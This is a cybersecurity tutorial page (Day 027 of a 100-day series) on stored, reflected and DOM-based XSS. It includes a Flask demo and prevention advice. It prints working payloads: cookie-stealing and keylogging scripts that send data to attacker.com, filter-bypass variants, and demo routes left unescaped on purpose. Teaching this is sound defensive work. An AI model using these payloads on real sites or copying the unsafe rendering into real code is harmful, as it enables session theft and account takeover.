# Day 027 - XSS: Stored, Reflected, and DOM-Based

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Yesterday we injected malicious SQL into a database query.

Today we inject malicious JavaScript into a webpage.

Cross-Site Scripting (XSS) allows an attacker to run arbitrary JavaScript in a victim's browser - in the context of a trusted website.

That means: steal session cookies, capture keystrokes, redirect users to phishing pages, or silently perform actions on their behalf.

XSS has been in the OWASP Top 10 for 20 years. It's the most prevalent web vulnerability by volume.

---

## 🎯 Why XSS Is Dangerous

JavaScript running in a browser can:

```javascript
// Steal session cookie (and send to attacker)
document.location = 'https://attacker.com/steal?c=' + document.cookie

// Capture everything the user types
document.addEventListener('keydown', e => {
  fetch('https://attacker.com/keys?k=' + e.key)
})

// Perform actions as the logged-in user
fetch('/transfer', {method: 'POST', body: 'amount=5000&to=attacker'})

// Deface the page
document.body.innerHTML = '<h1>Hacked</h1>'

// Redirect to phishing page
window.location = 'https://fake-bank.com'
```

The victim's browser does all of this - trusting it as legitimate site code.

---

## 📋 Three Types of XSS

### 1. Reflected XSS

Malicious script comes from the HTTP request - "reflected" back in the response.

**Example - search page:**
```
URL: https://site.com/search?q=<script>alert('XSS')</script>

Vulnerable response:
<p>Results for: <script>alert('XSS')</script></p>
```

The script executes in the victim's browser.

**How attackers use it:**
1. Craft a malicious URL
2. Send it to a victim via phishing email / social media
3. Victim clicks → script executes in their browser → session stolen

Reflected XSS doesn't persist - it only executes when the victim clicks the link.

---

### 2. Stored XSS (Persistent XSS)

Malicious script is saved in the application's database. Executes for every user who views the infected content.

**Example - comment section:**
```
Attacker posts this "comment":
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

This gets saved to the database.
Every user who loads that page executes the script.
Every session cookie gets sent to the attacker.
```

Stored XSS is the most dangerous variant - one payload, unlimited victims.

**Common injection points:**
- Comment sections
- User profiles / bio fields
- Forum posts
- Product reviews
- Support tickets
- Chat messages

---

### 3. DOM-Based XSS

The vulnerability exists in client-side JavaScript - not server-side code.

The server response is clean. The browser's JavaScript modifies the DOM unsafely.

**Example:**
```javascript
// Vulnerable JavaScript on the page:
var search = document.location.hash.substring(1);
document.getElementById('results').innerHTML = 'Results for: ' + search;

// Attacker's URL:
https://site.com/page#<img src=x onerror=alert('XSS')>

// innerHTML interprets the payload as HTML - executes
```

The server never sees the payload (it's in the URL fragment after #).
No server-side filtering can catch it.

---

## 🧪 Common XSS Payloads

```html
<!-- Basic test - confirm XSS exists -->
<script>alert('XSS')</script>

<!-- When script tags are filtered - event handlers -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>

<!-- Cookie stealing -->
<script>document.location='https://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- When quotes are filtered -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Bypass basic filters -->
<ScRiPt>alert('XSS')</ScRiPt>          <!-- case variation -->
<script >alert('XSS')</script >         <!-- space in tag -->
<<script>alert('XSS')//<</script>      <!-- nested tags -->

<!-- JavaScript URI -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- CSS injection (older browsers) -->
<div style="background:url('javascript:alert(1)')">
```

---

## 💻 The Code - XSS Demo

```python
"""
Day 027 - XSS Demo
100 Days of Cybersecurity by Sudeep Ravichandran

Demonstrates Stored and Reflected XSS vulnerabilities
alongside the correct prevention techniques.

Run: python3 xss_demo.py
Requires: pip install flask
Visit: http://127.0.0.1:5000
"""

from flask import Flask, request, render_template_string, escape

app = Flask(__name__)
comments = []  # In-memory "database"

# ─────────────────────────────────────────────────────
# VULNERABLE pages
# ─────────────────────────────────────────────────────

VULN_TEMPLATE = """
<html><body>
<h2>⚠️ VULNERABLE Comment Board</h2>
<form method="POST">
  <input name="comment" placeholder="Leave a comment..." size="50">
  <button type="submit">Post</button>
</form>
<hr>
<h3>Comments:</h3>
{% for c in comments %}
  <!-- ❌ Unsafe: renders raw HTML including any scripts -->
  <p>{{ c | safe }}</p>
{% endfor %}
<br><a href="/reflected/vulnerable?q=hello">Test Reflected XSS</a>
</body></html>
"""

@app.route("/stored/vulnerable", methods=["GET", "POST"])
def stored_vulnerable():
    if request.method == "POST":
        comment = request.form.get("comment", "")
        comments.append(comment)  # ❌ stored raw - no sanitisation
    return render_template_string(VULN_TEMPLATE, comments=comments)


@app.route("/reflected/vulnerable")
def reflected_vulnerable():
    query = request.args.get("q", "")
    # ❌ Reflected directly into page without escaping
    return f"""
    <html><body>
    <h2>⚠️ VULNERABLE Search</h2>
    <p>Results for: {query}</p>
    <p>Try: <code>?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
    </body></html>
    """


# ─────────────────────────────────────────────────────
# SECURE pages
# ─────────────────────────────────────────────────────

SECURE_TEMPLATE = """
<html><body>
<h2>✅ SECURE Comment Board</h2>
<form method="POST">
  <input name="comment" placeholder="Leave a comment..." size="50">
  <button type="submit">Post</button>
</form>
<hr>
<h3>Comments:</h3>
{% for c in comments %}
  <!-- ✅ Safe: Jinja2 auto-escaping converts < > to &lt; &gt; -->
  <p>{{ c }}</p>
{% endfor %}
<br><a href="/reflected/secure?q=hello">Test Reflected (Secure)</a>
</body></html>
"""

secure_comments = []

@app.route("/stored/secure", methods=["GET", "POST"])
def stored_secure():
    if request.method == "POST":
        comment = request.form.get("comment", "")
        secure_comments.append(comment)
    return render_template_string(SECURE_TEMPLATE, comments=secure_comments)


@app.route("/reflected/secure")
def reflected_secure():
    query = request.args.get("q", "")
    safe_query = escape(query)  # ✅ HTML escape user input
    return f"""
    <html><body>
    <h2>✅ SECURE Search</h2>
    <p>Results for: {safe_query}</p>
    <p>Try the same XSS payload - it won't execute.</p>
    </body></html>
    """


@app.route("/")
def index():
    return """
    <html><body>
    <h1>XSS Demo - Day 027</h1>
    <h3>Stored XSS:</h3>
    <a href="/stored/vulnerable">❌ Vulnerable comment board</a><br>
    <a href="/stored/secure">✅ Secure comment board</a>
    <h3>Reflected XSS:</h3>
    <a href="/reflected/vulnerable?q=test">❌ Vulnerable search</a><br>
    <a href="/reflected/secure?q=test">✅ Secure search</a>
    <hr>
    <p>Test payload: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
    <p>Image payload: <code>&lt;img src=x onerror=alert('XSS')&gt;</code></p>
    </body></html>
    """


if __name__ == "__main__":
    print("=" * 50)
    print("  XSS Demo - Day 027")
    print("  100 Days of Cybersecurity")
    print("=" * 50)
    print("\n  Visit: http://127.0.0.1:5000")
    print("  Test payload: <script>alert('XSS')</script>")
    print("  Image payload: <img src=x onerror=alert('XSS')>")
    app.run(debug=False)
```

**To run:**
```bash
pip install flask
python3 xss_demo.py
# Visit http://127.0.0.1:5000
```

---

## 🛡️ Prevention

| Method | How |
|--------|-----|
| Output encoding | Escape `< > " ' &` before rendering in HTML |
| Content Security Policy (CSP) | Browser header restricting what scripts can run |
| HttpOnly cookies | `Set-Cookie: session=abc; HttpOnly` - JS can't read it |
| Input validation | Reject unexpected characters at input |
| Use safe frameworks | React, Angular auto-escape by default |
| Avoid `innerHTML` | Use `textContent` instead - never interprets HTML |

**Most important:** Output encoding. Every time user-controlled data is rendered in HTML.

**CSP example:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
Even if XSS exists - this prevents external script loading and inline execution.

---

## 🔑 Key Takeaways

- Stored XSS is most dangerous - one payload affects every visitor
- Reflected XSS requires tricking the victim into clicking a crafted URL
- DOM XSS lives entirely in client-side JS - no server-side filter can stop it
- `HttpOnly` cookies stop the most common XSS goal - cookie theft
- CSP is the defence-in-depth layer - limits damage when XSS exists
- PortSwigger Web Academy has 30+ free XSS labs - best practice resource

---

## 📚 Resources
- [PortSwigger XSS Labs (free)](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [XSS Game by Google](https://xss-game.appspot.com/)

---

## [⬅️ Day 026](../day026/) | [➡️ Day 028](../day028/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*